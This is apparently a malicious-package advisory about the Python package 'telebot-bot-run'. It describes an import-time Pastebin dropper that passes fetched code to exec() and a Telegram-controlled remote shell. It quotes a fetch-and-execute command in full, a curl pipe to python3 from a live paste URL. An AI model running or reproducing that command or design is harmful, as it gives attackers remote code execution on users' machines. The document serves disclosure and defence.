summary: telebot-bot-run ships an import-time Pastebin dropper and Telegram-controlled remote shell
details: On import, telebot_bot_run/__init__.py performs an HTTPS GET to https://pastebin.com/raw/xAT1vudj and passes the response body to exec(), executing whatever the paste owner publishes inside the installer's Python process. The same __init__.py starts a Telegram bot in a background thread using a hardcoded bot token embedded in the module, binding the installer's host to an attacker-controlled Telegram channel (owner chat id 7889168418). Registered Telegram command handlers give the token holder full remote control of the host: `/ssh` executes arbitrary shell commands via subprocess.run(..., shell=True); other handlers read, upload, delete, list, and archive arbitrary files and directories. The /start handler additionally shells out to `curl -s https://pastebin.com/raw/xAT1vudj | python3 &`, providing a second remote fetch-and-execute path controlled by the Telegram operator. Package metadata (author "fuckkkkk you 2 3 4", description "Simple Scopper Library") is consistent with a throwaway malicious publish.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
